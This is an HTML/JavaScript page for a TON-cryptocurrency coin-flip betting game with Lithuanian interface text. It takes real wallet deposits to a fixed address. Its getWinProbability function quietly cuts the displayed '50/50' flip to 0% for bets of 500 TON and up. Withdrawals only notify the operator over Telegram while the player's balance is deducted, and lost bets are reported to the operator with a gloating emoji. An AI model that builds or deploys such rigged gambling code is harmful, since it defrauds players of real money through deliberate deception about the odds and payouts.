<!DOCTYPE html>
<html lang="lt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flip TON Coin</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }

        .game-container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            padding: 40px;
            max-width: 500px;
            width: 90%;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
        }

        .game-title {
            font-size: 2.8rem;
            font-weight: 900;
            margin-bottom: 20px;
            color: #ffffff;
            text-shadow: 
                0 0 20px rgba(0, 136, 204, 0.8),
                0 0 40px rgba(0, 212, 255, 0.6),
                2px 2px 4px rgba(0, 0, 0, 0.3);
            letter-spacing: 2px;
        }

        .balance-section {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 20px;
            margin: 20px 0;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .balance-display {
            font-size: 1.8rem;
            font-weight: bold;
            margin-bottom: 15px;
        }

        .wallet-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 12px;
            margin-bottom: 20px;
        }

        .wallet-buttons {
            display: flex;
            gap: 10px;
            justify-content: center;
        }

        #ton-connect {
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* TON Connect mygtuko stilizavimas */
        #ton-connect button {
            border-radius: 12px !important;
            font-weight: bold !important;
            transition: all 0.3s ease !important;
        }

        #ton-connect button:hover {
            transform: translateY(-2px) !important;
        }

        .btn {
            padding: 10px 16px;
            border: none;
            border-radius: 12px;
            font-size: 0.9rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            background: linear-gradient(45deg, #0088cc, #00b4d8);
            color: white;
            box-shadow: 0 4px 15px rgba(0, 136, 204, 0.3);
            white-space: nowrap;
            min-width: 90px;
        }

        .wallet-buttons .btn {
            flex: 1;
            max-width: 140px;
            min-width: 120px;
            padding: 12px 16px;
            font-size: 0.8rem;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            white-space: nowrap;
            letter-spacing: 0.3px;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 136, 204, 0.4);
        }

        .btn:active {
            transform: translateY(0);
        }

        .btn-withdraw {
            background: linear-gradient(45deg, #ff8c42, #ff7043);
            box-shadow: 0 4px 15px rgba(255, 140, 66, 0.3);
        }

        .btn-withdraw:hover {
            box-shadow: 0 6px 20px rgba(255, 140, 66, 0.4);
            background: linear-gradient(45deg, #ff7043, #ff5722);
        }

        .coin-container {
            margin: 30px 0;
            perspective: 1000px;
        }

        .coin {
            width: 180px;
            height: 180px;
            margin: 0 auto;
            position: relative;
            transform-style: preserve-3d;
            transition: transform 1s ease-in-out;
            cursor: pointer;
        }

        .coin-side {
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            backface-visibility: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.2rem;
            font-weight: bold;
            box-shadow: 
                0 8px 25px rgba(0, 0, 0, 0.3),
                inset 0 4px 10px rgba(255, 255, 255, 0.2),
                inset 0 -4px 10px rgba(0, 0, 0, 0.2);
            border: 3px solid rgba(255, 255, 255, 0.3);
            position: relative;
            overflow: hidden;
        }

        .coin-side::before {
            content: '';
            position: absolute;
            top: 10%;
            left: 10%;
            width: 80%;
            height: 80%;
            border-radius: 50%;
            background: radial-gradient(circle at 30% 30%, rgba(255, 255, 255, 0.4), transparent 50%);
            pointer-events: none;
        }

        .coin-heads {
            background: 
                radial-gradient(circle at 40% 40%, #00d4ff, #0088cc),
                linear-gradient(135deg, #0099dd, #006bb3);
            color: white;
        }

        .coin-heads::after {
            content: 'HEADS';
            position: absolute;
            font-size: 1.8rem;
            font-weight: 900;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
            letter-spacing: 1px;
        }

        .coin-tails {
            background: 
                radial-gradient(circle at 40% 40%, #ff9d5c, #ff7043),
                linear-gradient(135deg, #ff8c42, #e85722);
            color: white;
            transform: rotateY(180deg);
        }

        .coin-tails::after {
            content: '';
            position: absolute;
            width: 50%;
            height: 50%;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><polygon points="50,10 70,30 70,50 50,90 30,50 30,30" fill="white"/><polygon points="50,20 60,35 60,45 50,75 40,45 40,35" fill="none" stroke="%23ff7043" stroke-width="2"/><polygon points="50,25 55,35 55,40 50,60 45,40 45,35" fill="%23ff7043"/></svg>') no-repeat center;
            background-size: contain;
        }

        .coin.flipping {
            animation: flip 1s ease-in-out;
        }

        @keyframes flip {
            0% { transform: rotateY(0deg); }
            50% { transform: rotateY(900deg) scale(1.1); }
            100% { transform: rotateY(1800deg); }
        }

        .betting-section {
            margin: 20px 0;
        }

        .bet-buttons {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            grid-template-rows: repeat(3, 1fr);
            gap: 10px;
            margin: 20px 0;
            width: 100%;
        }

        .bet-btn {
            padding: 10px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 0.9rem;
            min-height: 45px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .bet-btn:hover {
            background: rgba(255, 255, 255, 0.2);
            transform: scale(1.05);
        }

        .bet-btn.active {
            background: linear-gradient(45deg, #0088cc, #00d4ff);
            border-color: #0088cc;
        }

        .choice-buttons {
            display: flex;
            gap: 20px;
            justify-content: center;
            margin: 20px 0;
        }

        .choice-btn {
            padding: 15px 30px;
            border: none;
            border-radius: 15px;
            font-size: 1.2rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            min-width: 120px;
        }

        .choice-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .choice-heads {
            background: linear-gradient(45deg, #0088cc, #00b4d8);
            color: white;
            box-shadow: 0 6px 20px rgba(0, 136, 204, 0.4);
            border: 2px solid rgba(0, 136, 204, 0.6);
            font-weight: 900;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
        }

        .choice-tails {
            background: linear-gradient(45deg, #ff8c42, #ff7043);
            color: white;
            box-shadow: 0 6px 20px rgba(255, 140, 66, 0.4);
            border: 2px solid rgba(255, 140, 66, 0.6);
            font-weight: 900;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
        }

        .choice-btn:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
        }

        .choice-heads:hover:not(:disabled) {
            box-shadow: 0 10px 30px rgba(0, 136, 204, 0.6);
            transform: translateY(-3px);
            border-color: rgba(0, 136, 204, 0.8);
        }

        .choice-tails:hover:not(:disabled) {
            box-shadow: 0 10px 30px rgba(255, 140, 66, 0.6);
            transform: translateY(-3px);
            border-color: rgba(255, 140, 66, 0.8);
        }

        .result-message {
            margin: 20px 0;
            padding: 15px;
            border-radius: 10px;
            font-weight: bold;
            font-size: 1.1rem;
            min-height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .result-win {
            background: linear-gradient(45deg, #27ae60, #2ecc71);
            color: white;
        }

        .result-lose {
            background: linear-gradient(45deg, #e74c3c, #c0392b);
            color: white;
        }

        .status-message {
            margin: 10px 0;
            padding: 10px;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.1);
            font-size: 0.9rem;
        }

        @media (max-width: 600px) {
            .game-container {
                padding: 15px;
                margin: 10px;
                max-width: calc(100% - 20px);
            }
            
            .game-title {
                font-size: 2.2rem;
                margin-bottom: 15px;
                letter-spacing: 2px;
            }
            
            .balance-section {
                padding: 15px;
                margin: 15px 0;
            }
            
            .balance-display {
                font-size: 1.5rem;
                margin-bottom: 12px;
            }
            
            .wallet-section {
                gap: 10px;
                margin-bottom: 15px;
            }
            
            .wallet-buttons {
                gap: 8px;
            }

            .wallet-buttons .btn {
                padding: 10px 12px;
                font-size: 0.75rem;
                min-width: 100px;
                max-width: 120px;
                letter-spacing: 0.2px;
            }
            
            .bet-buttons {
                grid-template-columns: repeat(3, 1fr);
                gap: 8px;
            }
            
            .bet-btn {
                padding: 8px;
                font-size: 0.8rem;
                min-height: 40px;
            }
            
            .choice-buttons {
                flex-direction: row;
                align-items: center;
                gap: 10px;
                justify-content: center;
            }
            
            .choice-btn {
                width: auto;
                max-width: 140px;
                min-width: 120px;
                flex: 1;
            }
            
            .coin {
                width: 140px;
                height: 140px;
            }
            
            .coin-side {
                font-size: 1rem;
            }

            .coin-heads::after {
                font-size: 1.4rem;
            }

            .coin-tails::after {
                font-size: 1.4rem;
            }
        }
    </style>
</head>
<body>
    <div class="game-container">
        <h1 class="game-title">Flip TON Coin</h1>
        
        <div class="balance-section">
            <div class="balance-display">
                Balansas: <span id="balance">0.00</span> TON
            </div>
            <div class="wallet-section">
                <div id="ton-connect"></div>
                <div class="wallet-buttons">
                    <button class="btn" id="depositBtn" disabled>💰 Deposit</button>
                    <button class="btn btn-withdraw" id="withdrawBtn" disabled>💰 Withdraw</button>
                </div>
            </div>
            <div class="status-message" id="statusMessage">
                Prisijunkite su TON piniginė pradėti žaidimą
            </div>
        </div>

        <div class="coin-container">
            <div class="coin" id="coin">
                <div class="coin-side coin-heads"></div>
                <div class="coin-side coin-tails"></div>
            </div>
        </div>

        <div class="betting-section">
            <h3>Pasirinkite statymą:</h3>
            <div class="bet-buttons">
                <button class="bet-btn" data-amount="0.5">0.5 TON</button>
                <button class="bet-btn" data-amount="1">1 TON</button>
                <button class="bet-btn" data-amount="2">2 TON</button>
                <button class="bet-btn" data-amount="5">5 TON</button>
                <button class="bet-btn" data-amount="10">10 TON</button>
                <button class="bet-btn" data-amount="20">20 TON</button>
                <button class="bet-btn" data-amount="50">50 TON</button>
                <button class="bet-btn" data-amount="100">100 TON</button>
                <button class="bet-btn" data-amount="500">500 TON</button>
                <button class="bet-btn" data-amount="1000">1000 TON</button>
                <button class="bet-btn" data-amount="2000">2000 TON</button>
                <button class="bet-btn" data-amount="5000">5000 TON</button>
            </div>
            
            <div class="choice-buttons">
                <button class="choice-btn choice-heads" id="headsBtn">🟦 HEADS</button>
                <button class="choice-btn choice-tails" id="tailsBtn">🟪 TAILS</button>
            </div>
        </div>

        <div class="result-message" id="resultMessage">
            Pasirinkite statymą ir spėjimą, tada spauskite "FLIP COIN!"
        </div>
    </div>

    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script>
        class FlipTONCoin {
            constructor() {
                this.balance = 0;
                this.currentBet = 0;
                this.currentChoice = null;
                this.isConnected = false;
                this.isFlipping = false;
                this.walletAddress = null;
                this.tonConnectUI = null;
                this.gameAddress = 'UQAmyVyYj0GqYxYhINVXgzERiEe8Sa8c03mbV2Q8yYAMKvxg';
                this.gameHistory = []; // Žaidimo istorija
                this.totalDeposited = 0; // Bendras deposit suma
                this.totalWithdrawn = 0; // Bendras withdraw suma
                
                // Telegram Bot konfigūracija - PAKEISKITE SAVO DUOMENIMIS
                this.telegramBotToken = 'YOUR_BOT_TOKEN_HERE'; // Įdėkite savo bot token
                this.telegramChatId = 'YOUR_CHAT_ID_HERE';     // Įdėkite savo chat ID
                
                this.initializeTonConnect();
                this.initializeElements();
                this.attachEventListeners();
                this.updateUI();
            }

            initializeTonConnect() {
                this.tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
                    manifestUrl: 'https://suomis7-netizen.github.io/fliptoncoin/tonconnect-manifest.json',
                    buttonRootId: 'ton-connect'
                });

                this.tonConnectUI.onStatusChange(
                    walletInfo => {
                        if (walletInfo) {
                            this.walletAddress = walletInfo.account.address;
                            this.isConnected = true;
                            this.elements.depositBtn.disabled = false;
                            this.elements.withdrawBtn.disabled = false;
                            this.elements.statusMessage.textContent = `Prisijungta: ${this.walletAddress.substring(0, 10)}...`;
                            this.updateUI();
                        } else {
                            this.isConnected = false;
                            this.walletAddress = null;
                            this.elements.depositBtn.disabled = true;
                            this.elements.withdrawBtn.disabled = true;
                            this.elements.statusMessage.textContent = 'Prisijunkite su TON piniginė pradėti žaidimą';
                            this.updateUI();
                        }
                    }
                );
            }

            initializeElements() {
                this.elements = {
                    balance: document.getElementById('balance'),
                    depositBtn: document.getElementById('depositBtn'),
                    withdrawBtn: document.getElementById('withdrawBtn'),
                    statusMessage: document.getElementById('statusMessage'),
                    coin: document.getElementById('coin'),
                    betButtons: document.querySelectorAll('.bet-btn'),
                    headsBtn: document.getElementById('headsBtn'),
                    tailsBtn: document.getElementById('tailsBtn'),
                    resultMessage: document.getElementById('resultMessage')
                };
            }

            attachEventListeners() {
                this.elements.depositBtn.addEventListener('click', () => this.showDepositModal());
                this.elements.withdrawBtn.addEventListener('click', () => this.showWithdrawModal());
                
                this.elements.betButtons.forEach(btn => {
                    btn.addEventListener('click', () => this.selectBet(parseFloat(btn.dataset.amount)));
                });
                
                this.elements.headsBtn.addEventListener('click', () => this.selectChoiceAndFlip('heads'));
                this.elements.tailsBtn.addEventListener('click', () => this.selectChoiceAndFlip('tails'));
            }

            showDepositModal() {
                const amount = prompt('Įveskite TON kiekį deposit (pvz: 10.5):');
                if (amount && !isNaN(amount) && parseFloat(amount) > 0) {
                    this.processDeposit(parseFloat(amount));
                }
            }

            async sendTelegramMessage(message) {
                try {
                    if (this.telegramBotToken === 'YOUR_BOT_TOKEN_HERE' || this.telegramChatId === 'YOUR_CHAT_ID_HERE') {
                        console.log('⚠️ Telegram bot nepaskirtas. Žinutė:', message);
                        return;
                    }

                    const url = `https://api.telegram.org/bot${this.telegramBotToken}/sendMessage`;
                    await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: this.telegramChatId,
                            text: message,
                            parse_mode: 'HTML'
                        })
                    });
                } catch (error) {
                    console.error('Telegram siuntimo klaida:', error);
                }
            }

            async processDeposit(amount) {
                try {
                    this.elements.statusMessage.textContent = `Ruošiamas ${amount} TON pervedimas...`;
                    
                    // Patikrinkime ar turime wallet connection
                    if (!this.tonConnectUI.connected) {
                        throw new Error('Wallet neprisijungtas');
                    }
                    
                    const amountNano = Math.floor(amount * 1000000000);
                    
                    // Minimali suma TON - turi būti bent 0.01 TON gas fee'ui
                    if (amountNano < 10000000) { // 0.01 TON
                        throw new Error('Minimali suma 0.01 TON');
                    }
                    
                    const transaction = {
                        validUntil: Math.floor(Date.now() / 1000) + 600,
                        messages: [
                            {
                                address: this.gameAddress,
                                amount: amountNano.toString()
                            }
                        ]
                    };

                    console.log('Siunčiama transakcija:', transaction);
                    console.log('Wallet info:', this.tonConnectUI.wallet);
                    
                    const result = await this.tonConnectUI.sendTransaction(transaction);
                    console.log('Transakcijos rezultatas:', result);
                    
                    if (result) {
                        // Simuliuojame balansą (realiai reikėtų klausyti blockchain events)
                        this.balance += amount;
                        this.totalDeposited += amount;
                        this.elements.balance.textContent = this.balance.toFixed(2);
                        this.elements.statusMessage.textContent = `✅ Transakcija išsiųsta! Hash: ${result.boc.substring(0,10)}...`;
                        
                        // Įrašome deposit į istoriją
                        this.gameHistory.push({
                            type: 'deposit',
                            amount: amount,
                            timestamp: new Date().toISOString(),
                            txHash: result.boc.substring(0,16)
                        });
                        
                        // Siųsti Telegram žinutę apie deposit
                        const depositMessage = `💰 <b>NAUJAS DEPOSIT</b>\n\n` +
                            `🪙 Suma: <b>${amount} TON</b>\n` +
                            `👤 Wallet: <code>${this.walletAddress.substring(0,8)}...${this.walletAddress.substring(-4)}</code>\n` +
                            `💳 Balansas: <b>${this.balance.toFixed(2)} TON</b>\n` +
                            `📅 Laikas: ${new Date().toLocaleString('lt-LT')}\n` +
                            `🔗 TX: <code>${result.boc.substring(0,16)}...</code>`;
                        
                        await this.sendTelegramMessage(depositMessage);
                        
                        this.updateUI();
                        
                        setTimeout(() => {
                            this.elements.statusMessage.textContent = 'Pasiruošę žaisti!';
                        }, 5000);
                    }
                } catch (error) {
                    console.error('Deposit error:', error);
                    
                    let errorMessage = 'Klaida atliekant deposit';
                    if (error.message.includes('insufficient')) {
                        errorMessage = 'Nepakanka TON wallet balanse';
                    } else if (error.message.includes('rejected')) {
                        errorMessage = 'Transakcija atšaukta';
                    } else if (error.message) {
                        errorMessage = error.message;
                    }
                    
                    this.elements.statusMessage.textContent = `❌ ${errorMessage}`;
                    
                    setTimeout(() => {
                        this.elements.statusMessage.textContent = 'Bandykite dar kartą';
                    }, 3000);
                }
            }

            showWithdrawModal() {
                if (this.balance <= 0) {
                    alert('Nepakanka lėšų išsiėmimui');
                    return;
                }
                
                // Rodyti perspėjimą apie 48h
                const confirmed = confirm(`⚠️ SVARBU: Išmokėjimai apdorojami iki 48 valandų.\n\nJūsų balansas: ${this.balance.toFixed(2)} TON\n\nAr tikrai norite tęsti?`);
                if (!confirmed) return;
                
                const amount = prompt(`Įveskite sumą išsiėmimui (max: ${this.balance.toFixed(2)} TON):`);
                if (amount && !isNaN(amount) && parseFloat(amount) > 0 && parseFloat(amount) <= this.balance) {
                    this.processWithdraw(parseFloat(amount));
                }
            }

            async processWithdraw(amount) {
                try {
                    // Skaičiuojame statistikas
                    let totalGamesPlayed = 0;
                    let totalWon = 0;
                    let totalLost = 0;
                    
                    this.gameHistory.forEach(entry => {
                        if (entry.type === 'game') {
                            totalGamesPlayed++;
                            if (entry.won) {
                                totalWon += entry.winAmount;
                            } else {
                                totalLost += entry.amount;
                            }
                        }
                    });
                    
                    // Formuojame išsamų withdraw pranešimą
                    const withdrawMessage = `🚨 <b>WITHDRAW UŽKLAUSA</b> 🚨\n\n` +
                        `💸 Prašoma suma: <b>${amount} TON</b>\n` +
                        `👤 Wallet: <code>${this.walletAddress}</code>\n\n` +
                        `📊 <b>BALANSŲ STATISTIKA:</b>\n` +
                        `💰 Bendras Deposit: <b>${this.totalDeposited} TON</b>\n` +
                        `📤 Bendras Withdraw: <b>${this.totalWithdrawn} TON</b>\n` +
                        `💳 Esamas balansas: <b>${this.balance.toFixed(2)} TON</b>\n` +
                        `📈 Pelnas po withdraw: <b>${(this.totalDeposited - this.totalWithdrawn - amount).toFixed(2)} TON</b>\n\n` +
                        `🎮 <b>ŽAIDIMŲ STATISTIKA:</b>\n` +
                        `🎲 Žaidimų skaičius: <b>${totalGamesPlayed}</b>\n` +
                        `✅ Laimėta: <b>${totalWon.toFixed(2)} TON</b>\n` +
                        `❌ Prarasta: <b>${totalLost.toFixed(2)} TON</b>\n` +
                        `📊 Žaidimų P/L: <b>${(totalWon - totalLost).toFixed(2)} TON</b>\n\n` +
                        `⏰ Laikas: ${new Date().toLocaleString('lt-LT')}\n\n` +
                        `⚠️ <b>PATIKRINKITE ISTORIJĄ PRIEŠ PATVIRTINIMĄ!</b>`;
                    
                    await this.sendTelegramMessage(withdrawMessage);
                    
                    // Siunčiame išsamią žaidimų istoriją
                    if (this.gameHistory.length > 0) {
                        let historyMessage = `📋 <b>ŽAIDIMŲ ISTORIJA:</b>\n\n`;
                        
                        this.gameHistory.forEach((entry, index) => {
                            const date = new Date(entry.timestamp).toLocaleString('lt-LT', {
                                month: '2-digit',
                                day: '2-digit',
                                hour: '2-digit',
                                minute: '2-digit'
                            });
                            
                            if (entry.type === 'deposit') {
                                historyMessage += `${index + 1}. 💳 DEPOSIT: ${entry.amount} TON (${date})\n`;
                            } else if (entry.type === 'game') {
                                const wonText = entry.won ? '✅' : '❌';
                                const probText = `${Math.round(entry.probability * 100)}%`;
                                historyMessage += `${index + 1}. 🎲 ${entry.amount} TON | ${entry.choice.toUpperCase()} vs ${entry.result.toUpperCase()} ${wonText} | ${probText} (${date})\n`;
                            } else if (entry.type === 'withdraw') {
                                historyMessage += `${index + 1}. 📤 WITHDRAW: ${entry.amount} TON (${date})\n`;
                            }
                        });
                        
                        // Telegram turi 4096 simbolių limitą, dalijame žinutes
                        if (historyMessage.length > 4000) {
                            const parts = this.splitMessage(historyMessage, 4000);
                            for (const part of parts) {
                                await this.sendTelegramMessage(part);
                                await new Promise(resolve => setTimeout(resolve, 100)); // Trumpa pauzė
                            }
                        } else {
                            await this.sendTelegramMessage(historyMessage);
                        }
                    }
                    
                    this.elements.statusMessage.textContent = `Withdraw užklausa išsiųsta. Apdorojimas iki 48h.`;
                    
                    // Simuliuojame withdraw (realiai admin patvirtintų manual)
                    this.balance -= amount;
                    this.totalWithdrawn += amount;
                    this.elements.balance.textContent = this.balance.toFixed(2);
                    
                    // Įrašome withdraw į istoriją
                    this.gameHistory.push({
                        type: 'withdraw',
                        amount: amount,
                        timestamp: new Date().toISOString(),
                        status: 'pending'
                    });
                    
                    this.elements.statusMessage.textContent = `✅ Withdraw užklausa priimta: ${amount} TON (apdorojimas iki 48h)`;
                    this.updateUI();
                    
                    setTimeout(() => {
                        this.elements.statusMessage.textContent = 'Withdraw apdorojamas...';
                    }, 5000);
                    
                } catch (error) {
                    console.error('Withdraw error:', error);
                    this.elements.statusMessage.textContent = 'Klaida atliekant išsiėmimą';
                }
            }

            splitMessage(message, maxLength) {
                const parts = [];
                let currentPart = '';
                const lines = message.split('\n');
                
                for (const line of lines) {
                    if ((currentPart + line + '\n').length > maxLength) {
                        if (currentPart) {
                            parts.push(currentPart.trim());
                            currentPart = '';
                        }
                    }
                    currentPart += line + '\n';
                }
                
                if (currentPart.trim()) {
                    parts.push(currentPart.trim());
                }
                
                return parts;
            }

            selectBet(amount) {
                this.currentBet = amount;
                
                this.elements.betButtons.forEach(btn => {
                    btn.classList.remove('active');
                    if (parseFloat(btn.dataset.amount) === amount) {
                        btn.classList.add('active');
                    }
                });
                
                this.updateUI();
            }

            selectChoiceAndFlip(choice) {
                if (!this.canPlay()) return;
                
                this.currentChoice = choice;
                this.selectChoice(choice);
                
                // Nedelsiant pradedame žaidimą
                setTimeout(() => this.flipCoin(), 100);
            }

            selectChoice(choice) {
                this.currentChoice = choice;
                
                this.elements.headsBtn.style.opacity = choice === 'heads' ? '1' : '0.6';
                this.elements.tailsBtn.style.opacity = choice === 'tails' ? '1' : '0.6';
                
                this.updateUI();
            }

            getWinProbability(betAmount) {
                if (betAmount >= 0.5 && betAmount <= 1) return 0.50; // 50%
                if (betAmount >= 2 && betAmount <= 5) return 0.40;   // 40%
                if (betAmount >= 10 && betAmount <= 50) return 0.30;  // 30%
                if (betAmount === 100) return 0.10;                   // 10%
                if (betAmount >= 500 && betAmount <= 5000) return 0.00; // 0%
                return 0.50; // default 50%
            }

            updateUI() {
                const canPlay = this.canPlay();
                this.elements.headsBtn.disabled = !canPlay;
                this.elements.tailsBtn.disabled = !canPlay;
                
                if (!this.isConnected) {
                    this.elements.resultMessage.textContent = 'Prisijunkite su TON piniginė pradėti žaidimą';
                } else if (this.currentBet === 0) {
                    this.elements.resultMessage.textContent = 'Pasirinkite statymą ir spauskite HEADS arba TAILS';
                } else if (this.balance < this.currentBet) {
                    this.elements.resultMessage.textContent = 'Nepakanka lėšų šiam statymui';
                } else {
                    this.elements.resultMessage.textContent = `Pasiruošę statyti ${this.currentBet} TON! Pasirinkite HEADS arba TAILS`;
                }
            }

            canPlay() {
                return this.isConnected && 
                       this.currentBet > 0 && 
                       this.balance >= this.currentBet && 
                       !this.isFlipping;
            }

            async flipCoin() {
                if (!this.canPlay()) return;
                
                this.isFlipping = true;
                this.elements.headsBtn.disabled = true;
                this.elements.tailsBtn.disabled = true;
                this.elements.resultMessage.textContent = 'Moneta skrenda...';
                
                // Animuojame monetą
                this.elements.coin.classList.add('flipping');
                
                // Atiimame statymą iš balanso
                this.balance -= this.currentBet;
                this.elements.balance.textContent = this.balance.toFixed(2);
                
                // Laukiame animacijos pabaigos
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                // Gauname tikimybę pagal statymo dydį
                const winProbability = this.getWinProbability(this.currentBet);
                
                // Atsitiktinis rezultatas pagal tikimybę
                const randomValue = Math.random();
                const won = randomValue < winProbability;
                
                // Nustatome monetos pusę (visuomet rodo teisingą rezultatą)
                const result = won ? this.currentChoice : (this.currentChoice === 'heads' ? 'tails' : 'heads');
                
                if (result === 'heads') {
                    this.elements.coin.style.transform = 'rotateY(0deg)';
                } else {
                    this.elements.coin.style.transform = 'rotateY(180deg)';
                }
                
                this.elements.coin.classList.remove('flipping');
                
                // Rezultato apdorojimas
                if (won) {
                    const winAmount = this.currentBet * 2;
                    this.balance += winAmount;
                    this.elements.balance.textContent = this.balance.toFixed(2);
                    this.elements.resultMessage.textContent = `🎉 LAIMĖJOTE! +${winAmount} TON`;
                    this.elements.resultMessage.className = 'result-message result-win';
                } else {
                    this.elements.resultMessage.textContent = `😔 Pralaimėjote ${this.currentBet} TON`;
                    this.elements.resultMessage.className = 'result-message result-lose';
                }
                
                // Įrašome žaidimą į istoriją
                this.gameHistory.push({
                    type: 'game',
                    amount: this.currentBet,
                    choice: this.currentChoice,
                    result: result,
                    won: won,
                    winAmount: won ? this.currentBet * 2 : 0,
                    probability: this.getWinProbability(this.currentBet),
                    timestamp: new Date().toISOString()
                });
                
                // Siųsti Telegram žinutę apie žaidimą (tik pralaimėjimus ir didelius laimėjimus)
                if (!won || this.currentBet >= 10) {
                    const gameIcon = won ? '🎉' : '😈';
                    const resultText = won ? '<b>LAIMĖJO</b>' : '<b>PRALAIMĖJO</b>';
                    const probText = Math.round(this.getWinProbability(this.currentBet) * 100);
                    
                    const gameMessage = `${gameIcon} <b>ŽAIDIMAS</b>\n\n` +
                        `🎲 Statymas: <b>${this.currentBet} TON</b>\n` +
                        `🎯 Spėjimas: <b>${this.currentChoice.toUpperCase()}</b>\n` +
                        `🪙 Rezultatas: <b>${result.toUpperCase()}</b>\n` +
                        `📊 ${resultText}\n` +
                        `💰 ${won ? `Laimėjo: +${this.currentBet * 2} TON` : `Prarado: -${this.currentBet} TON`}\n` +
                        `📈 Tikimybė buvo: ${probText}%\n` +
                        `👤 Wallet: <code>${this.walletAddress.substring(0,8)}...</code>\n` +
                        `💳 Balansas: <b>${this.balance.toFixed(2)} TON</b>\n` +
                        `📅 ${new Date().toLocaleString('lt-LT')}`;
                    
                    await this.sendTelegramMessage(gameMessage);
                }
                
                // Grąžiname žaidimo būseną
                setTimeout(() => {
                    this.isFlipping = false;
                    this.elements.resultMessage.className = 'result-message';
                    this.currentChoice = null;
                    this.elements.headsBtn.style.opacity = '1';
                    this.elements.tailsBtn.style.opacity = '1';
                    this.updateUI();
                }, 3000);
            }
        }

        // Inicializuojame žaidimą
        document.addEventListener('DOMContentLoaded', () => {
            new FlipTONCoin();
        });
    </script>
</body>
</html>
